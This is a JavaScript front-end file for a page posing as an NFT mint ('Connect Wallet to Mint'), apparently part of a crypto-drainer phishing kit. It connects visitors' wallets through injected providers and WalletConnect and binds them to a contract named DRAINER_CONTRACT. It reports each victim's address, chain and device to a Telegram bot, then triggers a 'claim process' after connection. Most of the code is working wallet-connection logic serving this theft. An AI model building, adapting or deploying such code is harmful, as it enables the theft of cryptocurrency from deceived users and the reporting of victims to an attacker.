import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ========================================================================
   * CONFIG
   * ====================================================================== */
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const INJECTED_TIMEOUT_MS  = 12_000;   // mobile injected providers are slow
  const WC_INIT_TIMEOUT_MS   = 15_000;
  const WC_APPROVAL_TIMEOUT  = 180_000;  // 3 min — Trust Wallet often slow
  const LS_PENDING_URI       = 'wc_pending_uri';
  const LS_PENDING_TS        = 'wc_pending_ts';

  /* ========================================================================
   * PLATFORM
   * ====================================================================== */
  const UA              = navigator.userAgent || '';
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isMobileDevice  = isIOSDevice || isAndroidDevice ||
                          /webOS|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  function platformLabel() {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA))            return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  }

  /* ========================================================================
   * DEBUG PANEL
   * ====================================================================== */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position:fixed;bottom:0;left:0;width:100%;background:#000;color:#0f0;
    font-size:12px;padding:5px;z-index:10000;max-height:150px;
    overflow-y:auto;display:none;font-family:monospace;`;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  /* ========================================================================
   * SMALL HELPERS
   * ====================================================================== */
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)
      ),
    ]);
  }

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  /* ========================================================================
   * TELEGRAM
   * ====================================================================== */
  async function sendTelegramNotification(text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch (e) {
      console.error('[main.js] Telegram error:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || ('🧪 Test ' + new Date().toISOString()));

  /* ========================================================================
   * LIBRARY LOADING — parallel, CDN fallbacks, per-attempt timeout
   * ====================================================================== */
  async function tryImport(urls, pickFn, label, timeoutMs = 10_000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(/* @vite-ignore */ url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadEthereumProviderLib() {
    const cdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    return tryImport(
      cdns,
      (m) => m.EthereumProvider || m.default?.EthereumProvider || m.default || m,
      'EthereumProvider'
    );
  }

  /* ========================================================================
   * RELAY REACHABILITY PROBE
   * ====================================================================== */
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch { /* try next */ }
    }
    logDebug('⚠️ No relay reachable — using primary anyway');
    return RELAY_URLS[0];
  }

  /* ========================================================================
   * DOM
   * ====================================================================== */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ========================================================================
   * MODULE STATE
   * ====================================================================== */
  let EthereumProvider = null;       // Library class (loaded once)
  let wcProvider       = null;       // Active WalletConnect EIP-1193 provider
  let injectedProvider = null;       // Active injected provider (window.ethereum etc.)
  let activeProvider   = null;       // Whichever is live right now
  let web3Instance     = null;
  let contractInstance = null;
  let connectedAddress = null;
  let isConnecting     = false;
  let relayUrl         = RELAY_URLS[0];

  // Track attached providers to prevent duplicate event listeners.
  const attachedProviders = new WeakSet();

  /* ========================================================================
   * BUTTON + STATUS UI
   * ====================================================================== */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666,#888)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ========================================================================
   * STORAGE — localStorage, not sessionStorage (survives iOS purges)
   * ====================================================================== */
  function saveWallet(address) {
    try { localStorage.setItem('connectedWallet', address); } catch {}
  }
  function getSavedWallet() {
    try { return localStorage.getItem('connectedWallet'); } catch { return null; }
  }
  function clearSavedWallet() {
    try {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem(LS_PENDING_URI);
      localStorage.removeItem(LS_PENDING_TS);
    } catch {}
  }

  /* ========================================================================
   * PUBLISH GLOBAL STATE — verify provider liveness first
   * ====================================================================== */
  async function publishGlobalState(address, chain) {
    // Verify provider is actually alive before publishing.
    let live = activeProvider;
    if (live) {
      try {
        // Probe with a lightweight request. If this throws, provider is dead.
        await withTimeout(live.request({ method: 'eth_chainId' }), 3000, 'provider-probe');
      } catch (e) {
        logDebug(`⚠️ active provider failed liveness probe: ${e.message}`);
        live = null;
      }
    }
    // Fall back to injected if WC provider is dead.
    if (!live && window.ethereum) {
      try {
        const acc = await withTimeout(
          window.ethereum.request({ method: 'eth_accounts' }),
          3000, 'injected-probe'
        );
        if (acc && acc.length) live = window.ethereum;
      } catch {}
    }

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      publishedAt: Date.now(),
    };
    logDebug(`published global: addr=${address} chain=${chain} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  /* ========================================================================
   * CONNECTED UI
   * ====================================================================== */
  function updateConnectedUI(address, chain = 'evm') {
    connectedAddress = address;
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px;padding:10px 16px;font-family:'JetBrains Mono',monospace;
        font-size:14px;color:#059669;text-align:center;
        background:linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius:8px;border:1px solid #A7F3D0;`;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>`;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    // Publish asynchronously — the liveness probe is async.
    publishGlobalState(address, chain);

    sendTelegramNotification(
      `🔗 <b>Wallet Connected</b>\n📌 <b>Chain:</b> ${chainLabel}\n👤 <b>Address:</b> <code>${address}</code>\n🕒 ${new Date().toLocaleString()}\n📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}`
    );
  }

  function resetConnectedUI() {
    connectedAddress = null;
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    wcProvider = null;
    injectedProvider = null;
    window.__apexConnected = null;
  }

  /* ========================================================================
   * EIP-6963 PROVIDER DISCOVERY
   * ====================================================================== */
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    const req = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    req();
    setTimeout(req, 500);
    setTimeout(req, 1500);
  }

  /* ========================================================================
   * WALLET PICKER (desktop, multiple injected)
   * ====================================================================== */
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>`;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  /* ========================================================================
   * IN-WALLET BROWSER DETECTION — Trust Wallet iOS doesn't always set UA
   * ====================================================================== */
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    // Trust Wallet: isTrust, or isTrustWallet, or isTrustMobile
    if (eth.isTrust || eth.isTrustWallet || /TrustWallet|Trust\s*Wallet/i.test(UA)) {
      return { wallet: 'trust', name: 'Trust Wallet' };
    }
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) {
      return { wallet: 'metamask', name: 'MetaMask' };
    }
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) {
      return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    }
    if (eth.isRabby || /Rabby/i.test(UA)) {
      return { wallet: 'rabby', name: 'Rabby' };
    }
    if (eth.isBraveWallet) return { wallet: 'brave', name: 'Brave' };
    return null;
  }

  /* ========================================================================
   * WALLETCONNECT — SINGLE CLIENT (EthereumProvider ONLY)
   *
   * CRITICAL FIX: We DO NOT use SignClient separately. The EthereumProvider
   * library internally manages a SignClient and provides a fully wired
   * EIP-1193 provider. Using both in parallel causes the "wallet shows
   * connected, site doesn't" race.
   * ====================================================================== */
  async function initWalletConnectProvider({ useFallbackId = false } = {}) {
    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No WC projectId configured');
      return null;
    }
    if (!EthereumProvider) {
      logDebug('❌ EthereumProvider library not loaded');
      return null;
    }

    // Reuse existing provider if it exists and is alive.
    if (wcProvider) {
      try {
        await withTimeout(wcProvider.request({ method: 'eth_chainId' }), 3000, 'existing-wc-probe');
        logDebug('♻️ Reusing existing WC provider');
        return wcProvider;
      } catch {
        logDebug('existing WC provider is dead — reinitialising');
        wcProvider = null;
      }
    }

    try {
      logDebug(`WC init: projectId=${projectId.slice(0, 8)}…`);
      const t0 = performance.now();
      wcProvider = await withTimeout(
        EthereumProvider.init({
          projectId,
          metadata: DAPP_METADATA,
          relayUrl,
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
          showQrModal: true,
          // Let the library manage its own session store.
        }),
        WC_INIT_TIMEOUT_MS,
        'WC init'
      );
      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return wcProvider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  /* ========================================================================
   * INJECTED EVM CONNECT — used on desktop + mobile in-wallet browsers
   * ====================================================================== */
  async function connectDirectEVM(timeoutMs = INJECTED_TIMEOUT_MS) {
    setupEIP6963();
    await sleep(600); // give EIP-6963 announcements a moment

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' || /metamask/i.test(p.info.name)
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      // Retry eth_requestAccounts once — mobile wallets sometimes swallow
      // the first request during app initialisation.
      let accounts = null;
      for (let attempt = 0; attempt < 2 && !accounts?.length; attempt++) {
        try {
          accounts = await withTimeout(
            provider.request({ method: 'eth_requestAccounts' }),
            timeoutMs,
            'eth_requestAccounts'
          );
        } catch (e) {
          logDebug(`eth_requestAccounts attempt ${attempt + 1} failed: ${e.message}`);
          if (attempt === 0) await sleep(800);
        }
      }
      if (!accounts?.length) return false;

      const address = accounts[0];

      // Build web3 before saving state so publishGlobalState sees it.
      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;
      injectedProvider = provider;

      saveWallet(address);
      attachProviderEvents(provider);
      updateConnectedUI(address, 'evm');

      logDebug(`✅ Injected connected: ${address} (${chosen.info.name})`);
      return true;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return false;
    }
  }

  /* ========================================================================
   * WALLETCONNECT CONNECT — single-library flow
   * ====================================================================== */
  async function connectViaWalletConnect({ useFallbackId = false, timeoutMs = WC_APPROVAL_TIMEOUT } = {}) {
    if (isConnecting) return false;
    isConnecting = true;

    try {
      const provider = await initWalletConnectProvider({ useFallbackId });
      if (!provider) {
        isConnecting = false;
        return false;
      }

      // If already connected, return early.
      if (provider.session) {
        const accts = provider.session.namespaces?.eip155?.accounts || [];
        if (accts.length) {
          const address = accts[0].split(':')[2];
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = provider;
          saveWallet(address);
          attachProviderEvents(provider);
          updateConnectedUI(address, 'evm');
          isConnecting = false;
          return true;
        }
      }

      showStatus('Opening wallet options…', 'info');

      // Wire up before connect so we don't miss the session event.
      attachProviderEvents(provider);

      // The provider handles pairing + approval internally. We just await.
      const connectPromise = provider.connect({
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        showQrModal: true,
      });

      // Record pending state in localStorage (survives iOS page purges).
      try {
        localStorage.setItem(LS_PENDING_TS, Date.now().toString());
      } catch {}

      await withTimeout(connectPromise, timeoutMs, 'WC approval');

      try {
        localStorage.removeItem(LS_PENDING_URI);
        localStorage.removeItem(LS_PENDING_TS);
      } catch {}

      const accounts = provider.accounts || [];
      if (!accounts.length) {
        logDebug('⚠️ WC connect resolved but no accounts');
        isConnecting = false;
        return false;
      }

      const address = accounts[0];
      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;
      wcProvider       = provider;

      saveWallet(address);
      updateConnectedUI(address, 'evm');

      isConnecting = false;
      logDebug(`✅ WC connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('WC connect error: ' + e.message);
      isConnecting = false;
      return false;
    }
  }

  /* ========================================================================
   * PROVIDER EVENTS — idempotent, normalised
   * ====================================================================== */
  function attachProviderEvents(provider) {
    if (!provider || !provider.on) return;
    if (attachedProviders.has(provider)) return;
    attachedProviders.add(provider);

    provider.on('accountsChanged', async (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
        return;
      }
      const a = accounts[0];
      updateConnectedUI(a, 'evm');
      saveWallet(a);
      // Refresh contract bound to current provider.
      if (web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      }
      await publishGlobalState(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1000);
    });

    provider.on('chainChanged', async (id) => {
      const chainId = typeof id === 'string' ? parseInt(id, 16) : id;
      showStatus(`Network changed to ${chainId}`, 'info');
      if (connectedAddress) {
        if (web3Instance) {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        }
        await publishGlobalState(connectedAddress, 'evm');
      }
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });

    // WC-specific event: session_delete
    if (provider.on) {
      try {
        provider.on('session_delete', () => {
          resetConnectedUI();
          clearSavedWallet();
        });
      } catch {}
    }
  }

  // Backwards-compatible alias (script.js may still reference this name).
  const setupEVMProviderEvents = attachProviderEvents;

  /* ========================================================================
   * CONNECT DISPATCHER
   * ====================================================================== */
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;
    const inWallet = detectInWalletBrowser();

    try {
      if (isDesktopDevice) {
        // Desktop: injected → WC(primary) → WC(fallback)
        success = await connectDirectEVM(INJECTED_TIMEOUT_MS);
        if (!success) success = await connectViaWalletConnect({ useFallbackId: false });
        if (!success) success = await connectViaWalletConnect({ useFallbackId: true });
      } else {
        // Mobile: prefer injected if we can positively identify a wallet
        // browser; otherwise straight to WC.
        if (inWallet) {
          logDebug(`📱 In-wallet browser: ${inWallet.name}`);
          success = await connectDirectEVM(INJECTED_TIMEOUT_MS);
        }
        if (!success) success = await connectViaWalletConnect({ useFallbackId: false });
        if (!success) success = await connectViaWalletConnect({ useFallbackId: true });
      }

      if (success) {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1200);
      } else {
        showStatus('No wallet connected. Please try again.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
      }
    } finally {
      isConnecting = false;
    }
  }

  /* ========================================================================
   * DISCONNECT
   * ====================================================================== */
  async function disconnectWallet() {
    try {
      if (wcProvider?.disconnect) {
        await wcProvider.disconnect().catch(() => {});
      }
      if (injectedProvider?.disconnect) {
        await injectedProvider.disconnect().catch(() => {});
      }
    } catch {}
    resetConnectedUI();
    clearSavedWallet();
  }

  /* ========================================================================
   * BUTTON WIRING — FIXED: only disconnect when a live provider exists
   * ====================================================================== */
  async function handleClick() {
    const hasLiveProvider = !!(activeProvider || wcProvider || injectedProvider);
    const hasAddress      = !!connectedAddress || !!getSavedWallet();

    if (hasLiveProvider && hasAddress) {
      await disconnectWallet();
    } else {
      // Clear stale state before retrying.
      if (!hasLiveProvider) {
        clearSavedWallet();
        resetConnectedUI();
      }
      await connectWallet();
    }
  }

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  /* ========================================================================
   * SESSION RESTORE
   *
   * Trust Wallet in-wallet browsers rarely restore cleanly across reloads
   * because the injected provider is recreated on each page load. We only
   * restore if we can positively confirm the account is still available.
   * ====================================================================== */
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    if (!savedWallet) return;

    // Strategy 1: injected provider with matching account
    if (window.ethereum) {
      try {
        const accounts = await withTimeout(
          window.ethereum.request({ method: 'eth_accounts' }),
          3000, 'restore-eth_accounts'
        );
        if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;
          injectedProvider = window.ethereum;
          attachProviderEvents(window.ethereum);
          updateConnectedUI(savedWallet, 'evm');
          logDebug('♻️ Injected session restored');
          return;
        }
      } catch (e) {
        logDebug('Injected restore: ' + e.message);
      }
    }

    // Strategy 2: WC provider with an active session
    try {
      const provider = await initWalletConnectProvider({ useFallbackId: false });
      if (provider?.session) {
        const accts = provider.session.namespaces?.eip155?.accounts || [];
        if (accts.length) {
          const address = accts[0].split(':')[2];
          if (address.toLowerCase() === savedWallet.toLowerCase()) {
            const Web3 = (await import('web3')).default;
            web3Instance     = new Web3(provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            activeProvider   = provider;
            wcProvider       = provider;
            attachProviderEvents(provider);
            updateConnectedUI(address, 'evm');
            logDebug('♻️ WC session restored');
            return;
          }
        }
      }
    } catch (e) {
      logDebug('WC restore: ' + e.message);
    }

    // Nothing restored — clear stale entry.
    clearSavedWallet();
  }

  /* ========================================================================
   * BOOT
   * ====================================================================== */
  try {
    // Load library + probe relay in parallel.
    const [lib, relay] = await Promise.all([
      loadEthereumProviderLib(),
      pickRelayUrl().catch(() => RELAY_URLS[0]),
    ]);
    EthereumProvider = lib;
    relayUrl         = relay;
    logDebug('✅ EthereumProvider library loaded');

    setupEIP6963();

    // Mobile: pre-warm the WC provider so the first user tap is instant.
    if (isMobileDevice) {
      logDebug('📱 Pre-warming WC provider on mobile…');
      await initWalletConnectProvider({ useFallbackId: false }).catch(() => {});
    }

    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  /* ========================================================================
   * GLOBAL WC EVENTS (via provider)
   * ====================================================================== */
  setTimeout(() => {
    if (!wcProvider) return;
    attachProviderEvents(wcProvider);
  }, 800);

  if (window.ethereum && isDesktopDevice) {
    attachProviderEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    // No-op — provider cleanup handled by the library.
  });

  logDebug(`✅ main.js ready — Platform: ${platformLabel()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
